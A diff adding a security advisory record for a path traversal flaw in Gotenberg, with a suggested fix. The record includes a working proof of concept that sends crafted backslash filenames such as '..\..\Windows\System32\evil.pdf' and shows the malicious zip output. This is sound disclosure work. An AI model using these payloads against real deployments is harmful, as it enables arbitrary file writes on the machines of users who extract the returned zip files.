@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-hwc4-gmrw-5222",
+  "modified": "2026-05-29T16:45:10.026115987Z",
+  "published": "2026-05-29T16:38:24Z",
+  "aliases": [
+    "CVE-2026-44829"
+  ],
+  "summary": "Gotenberg has path traversal in zip entry name via Windows-style separators in upload filename",
+  "details": "### Summary\n`filepath.Base` on the Linux container does not strip backslashes (`\\`), because `\\` is only a path separator on Windows. A multipart filename like `..\\..\\..\\..\\Windows\\System32\\evil.pdf` survives Gotenberg's input sanitisation and lands verbatim as the zip entry name when a multi-output route returns its result as a zip (e.g. `/forms/pdfengines/split`). Windows zip extractors interpret `\\` as a path separator and write the file outside the extraction directory.\n\n### Details\n`pkg/modules/api/context.go:434, 472`:\n```go\nfilename := norm.NFC.String(filepath.Base(fh.Filename))\n```\nOn Linux, `filepath.Base(\"..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil.pdf\")` returns the same string verbatim — there are no `/` separators to find. The original filename then flows to `ctx.diskToOriginal` (`pkg/modules/api/context.go:459, 393`) and through `pkg/modules/pdfengines/routes.go:287-322` (`SplitPdfStub`), which builds:\n```go\noriginalNameNoExt := strings.TrimSuffix(originalName, filepath.Ext(originalName))\nnewOriginal      := fmt.Sprintf(\"%s_%d.pdf\", originalNameNoExt, i)\nctx.RegisterDiskPath(newPath, newOriginal)\n```\nFinally `pkg/modules/api/context.go:617-642` constructs the zip via `archives.FilesFromDisk` + `archives.Zip{}.Archive`. `mholt/archives@v0.1.5/archives.go:155-184` (`nameOnDiskToNameInArchive`) returns `path.Join(rootInArchive, \"\")` — the map value verbatim.\n\n### Suggested fix\n```diff\n- filename := norm.NFC.String(filepath.Base(fh.Filename))\n+ filename := sanitizeFilename(fh.Filename)\n+\n+ func sanitizeFilename(name string) string {\n+     if i := strings.LastIndexAny(name, \"/\\\\\"); i \u003e= 0 {\n+         name = name[i+1:]\n+     }\n+     name = norm.NFC.String(name)\n+     // Optional belt-and-braces:\n+     name = strings.ReplaceAll(name, \"..\", \"_\")\n+     name = strings.Map(func(r rune) rune {\n+         if r \u003c 0x20 || r == 0x7f { return -1 }\n+         return r\n+     }, name)\n+     return name\n+ }\n```\nThe same sanitiser closes Advisory 8.\n\n### PoC\n**Prerequisite:** `pip install requests`. `curl -F filename=` mangles backslashes on some shells, so we use Python's `requests` to deliver the malicious filename byte-perfect.\n\n```bash\nmkdir -p /tmp/gotenberg-poc \u0026\u0026 cd /tmp/gotenberg-poc\n\ndocker rm -f gotenberg-audit 2\u003e/dev/null\ndocker run -d --rm --name gotenberg-audit -p 3000:3000 gotenberg/gotenberg:8.32.0\ni=0; until [ \"$(curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/health)\" = \"200\" ] || [ $i -ge 30 ]; do i=$((i+1)); sleep 2; done\n\n# Stub PDF.\nprintf '%%PDF-1.4\\n1 0 obj\u003c\u003c/Type/Catalog/Pages 2 0 R\u003e\u003eendobj\\n2 0 obj\u003c\u003c/Type/Pages/Kids[3 0 R]/Count 1\u003e\u003eendobj\\n3 0 obj\u003c\u003c/Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]\u003e\u003eendobj\\nxref\\n0 4\\n0000000000 65535 f\\n0000000010 00000 n\\n0000000053 00000 n\\n0000000100 00000 n\\ntrailer\u003c\u003c/Size 4/Root 1 0 R\u003e\u003e\\nstartxref\\n158\\n%%%%EOF\\n' \u003e stub.pdf\n\n# Step 1: produce a 2-page PDF so /split returns multiple entries.\ncurl -s -o two.pdf -X POST http://localhost:3000/forms/pdfengines/merge \\\n    -F 'files=@stub.pdf;filename=a.pdf' \\\n    -F 'files=@stub.pdf;filename=b.pdf'\n\n# Step 2: split, declaring the multipart filename as a Windows path-traversal payload.\npython3 - \u003c\u003c'PY'\nimport requests, zipfile, binascii\nfname = '..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil.pdf'\nfiles = {'files': (fname, open('two.pdf', 'rb'), 'application/pdf')}\ndata  = {'splitMode': 'intervals', 'splitSpan': '1'}\nr = requests.post('http://localhost:3000/forms/pdfengines/split', files=files, data=data)\nprint(f'HTTP={r.status_code}  ctype={r.headers.get(\"content-type\")}  bytes={len(r.content)}')\nopen('split.zip', 'wb').write(r.content)\n\nz = zipfile.ZipFile('split.zip')\nprint('--- zip entries (orig_filename) ---')\nfor info in z.infolist():\n    print(f'   {info.orig_filename!r}')\n\n# Show raw central-directory bytes to prove backslashes are on the wire:\ndata = open('split.zip', 'rb').read()\nidx = data.find(b'PK\\x01\\x02')\nprint('--- raw central-dir hex around filename ---')\nprint(f'   {binascii.hexlify(data[idx:idx+80]).decode()}')\nPY\n\ndocker stop gotenberg-audit\n```\n\n**Observed output:**\n```\nHTTP=200  ctype=application/zip  bytes=24750\n--- zip entries (orig_filename) ---\n   '..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil_0.pdf'\n   '..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\evil_1.pdf'\n--- raw central-dir hex around filename ---\n   504b010214031400080800009a7da25c61b6fc178e2f00008e2f0000270009000000000000000000a481000000002e2e5c2e2e5c2e2e5c2e2e5c57696e646f77735c53797374656d33325c6576696c5f\n```\n\nThe trailing hex `2e2e5c 2e2e5c 2e2e5c 2e2e5c 57696e646f7773 5c 53797374656d3332 5c 6576696c5f` decodes to `..\\..\\..\\..\\Windows\\System32\\evil_`. (Python's `ZipFile.namelist()` would normally hide this by displaying `/`, but `info.orig_filename` returns the literal backslash form.)\n\nTo see the Windows-side traversal effect on a Windows host, run:\n```powershell\nExpand-Archive -Path .\\split.zip -DestinationPath .\\out -Force\nGet-ChildItem .\\out -Recurse\n# → out\\Windows\\System32\\evil_0.pdf\n# → out\\Windows\\System32\\evil_1.pdf\n```\nPowerShell collapses the `..` parents but creates the `Windows\\System32\\` subdirectory tree. 7-Zip and WinRAR with default settings honor the `..` parents and traverse out of the extraction directory entirely.\n\n### Impact\n- Arbitrary file write on a Windows-side consumer that extracts the returned zip (Windows Explorer, 7-Zip, WinRAR, .NET `ZipFile.ExtractToDirectory`).\n- Reachable via every multi-output Gotenberg route — `/forms/pdfengines/split`, `/forms/pdfengines/flatten`/`/encrypt`/`/embed`/`/watermark`/`/stamp`/`/rotate` (when called with multiple input PDFs), `/forms/libreoffice/convert` with multiple inputs, `/forms/pdfengines/convert`.\n- Also reachable via `downloadFrom` upstream `Content-Disposition: filename=\"..\\\\..\\\\evil.exe\"` — the filename flows through the same `ctx.diskToOriginal` map at `pkg/modules/api/context.go:354, 393`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.33.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 8.32.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-hwc4-gmrw-5222/GHSA-hwc4-gmrw-5222.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-hwc4-gmrw-5222"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/releases/tag/v8.33.0"
+    }
+  ]
+}
